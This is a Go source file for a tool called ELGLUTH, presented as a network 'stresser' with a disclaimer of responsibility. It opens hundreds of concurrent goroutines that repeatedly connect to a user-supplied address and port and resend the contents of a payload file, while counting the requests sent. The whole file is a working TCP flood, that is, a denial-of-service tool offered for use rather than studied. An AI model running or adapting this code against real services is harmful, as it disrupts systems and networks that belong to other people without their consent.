// 	ELGLUTH - scourge on Khuzdûl
// 	Made by LLlE0 - https://github.com/LLlE0/
//  I do not take responsibility for your deeds

package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"time"
)

var inc int64

func PrintName() {
	fmt.Println(`                                                                             
    _/_/_/_/  _/          _/_/_/  _/        _/    _/  _/_/_/_/_/  _/    _/   
   _/        _/        _/        _/        _/    _/      _/      _/    _/    
  _/_/_/    _/        _/  _/_/  _/        _/    _/      _/      _/_/_/_/     
 _/        _/        _/    _/  _/        _/    _/      _/      _/    _/      
_/_/_/_/  _/_/_/_/    _/_/_/  _/_/_/_/    _/_/        _/      _/    _/       
by github.com/LLlE0
                                 
The stressing started! (Any input to stop)
																		`)
}
func sendMessages(address string) {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Printf("Error while connecting: %v\n", err)
		return
	}
	defer conn.Close()
	message, err := os.ReadFile("payload.txt")
	if err != nil {
		fmt.Println("Something went wrong: can't read payload.txt file!")
		os.Exit(2)
	}
	_, err = conn.Write(message)
	if err != nil {
		fmt.Printf("Error sending message: %v\n", err)
		return
	}
	time.Sleep(time.Millisecond * 10)

	inc += 1

}

func main() {
	defer exec.Command("cmd", "/c", "clear")
	if len(os.Args) != 3 {
		fmt.Println("Usage: go run main.go <address:port>, <amount of threads (200-1000 recommended)>")
		os.Exit(1)
	}
	address := os.Args[1]
	threads := os.Args[2]
	th_num, err := strconv.Atoi(threads)
	if err != nil {
		fmt.Println("Usage: go run main.go <address:port>, <amount of threads (200-1000 recommended)>")
		os.Exit(1)
	}

	PrintName()
	for i := 0; i < th_num; i++ {
		go func() {
			for {

				sendMessages(address)
				time.Sleep(300 * time.Millisecond)
			}
		}()

	}

	ticker := time.Tick(2 * time.Second)
	go func() {
		for range ticker {
			fmt.Printf("Requests sent: %d\n", inc)
		}
	}()

	//ZAGLUSHKA

	fmt.Scanf(address)
}
